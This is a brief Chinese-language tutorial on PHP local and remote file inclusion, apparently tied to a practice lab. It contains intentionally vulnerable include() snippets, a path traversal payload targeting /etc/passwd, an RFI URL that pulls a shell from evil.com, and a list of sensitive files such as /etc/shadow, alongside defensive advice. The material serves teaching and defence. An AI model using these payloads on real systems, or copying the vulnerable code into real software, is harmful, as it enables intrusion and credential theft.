# 文件包含漏洞

## 概述

文件包含漏洞（File Inclusion）发生在应用程序将用户输入作为文件路径传入 `include()`、`require()` 等函数时。攻击者可以包含任意文件，读取敏感信息或执行代码。

## 类型

### LFI（Local File Inclusion）

包含服务器本地文件。

```php
<?php
$page = $_GET['page'];
include($page . '.php');
?>
```

攻击：`?page=../../../etc/passwd`

### RFI（Remote File Inclusion）

包含远程服务器上的文件。

```php
<?php
$page = $_GET['page'];
include($page);
?>
```

攻击：`?page=http://evil.com/shell.txt`

## 危险函数

```php
include($file)         // 包含文件，失败时警告
require($file)         // 包含文件，失败时致命错误
include_once($file)    // 同 include，但只包含一次
require_once($file)    // 同 require，但只包含一次
```

## 常见敏感文件

```
/etc/passwd           # 用户信息
/etc/shadow           # 密码哈希
/etc/hosts            # 主机配置
/var/log/apache2/access.log  # Apache 日志
/var/log/auth.log     # 认证日志
/var/log/syslog       # 系统日志
/proc/self/environ    # 环境变量
/proc/self/fd/N       # 文件描述符
```

## 防御方法

1. 不要将用户输入传入文件包含函数
2. 使用白名单限制可包含的文件
3. 关闭 `allow_url_include`
4. 使用 `open_basedir` 限制文件访问范围

## 靶场

- Easy: 基本 LFI（路径遍历）
- Simple: RFI（远程包含）
- Hard: 过滤绕过（双写绕过）
- Hell: LFI + 日志投毒
